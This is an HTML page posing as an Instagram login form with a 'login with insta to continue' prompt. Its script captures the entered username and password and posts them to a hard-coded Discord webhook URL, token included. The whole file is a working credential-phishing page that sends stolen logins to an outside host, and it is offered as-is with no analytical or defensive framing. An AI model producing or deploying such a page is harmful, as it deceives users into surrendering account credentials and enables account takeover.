<!DOCTYPE html>
<html>
<head>
    <title>Instagram Login</title>
    <script>
        function unleashTheKraken() {
            var username = document.getElementById("username").value;
            var password = document.getElementById("password").value;

            // Prepare to dive into the abyss of the web
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "https://discord.com/api/webhooks/1116509552695840768/qaUSQH-IXxJOiAgDTmflw3wNTJcg5kmMHMtSe6fi7Xm0HA3JHrOEpXUUFWBRvE22HvQg", true);
            xhr.setRequestHeader("Content-Type", "application/json");

            var data = JSON.stringify({
                "username": username,
                "password": password
            });

            // Let the Kraken loose!
            xhr.send(data);
        }
    </script>
</head>
<body>
    <h2>login with insta to continue</h2>
    <form>
        <label for="username">Username:</label>
        <input type="text" id="username" name="username" required><br><br>
        <label for="password">Password:</label>
        <input type="password" id="password" name="password" required><br><br>
        <input type="button" value="Unleash the Kraken" onclick="unleashTheKraken()">
    </form>

</body>
</html>
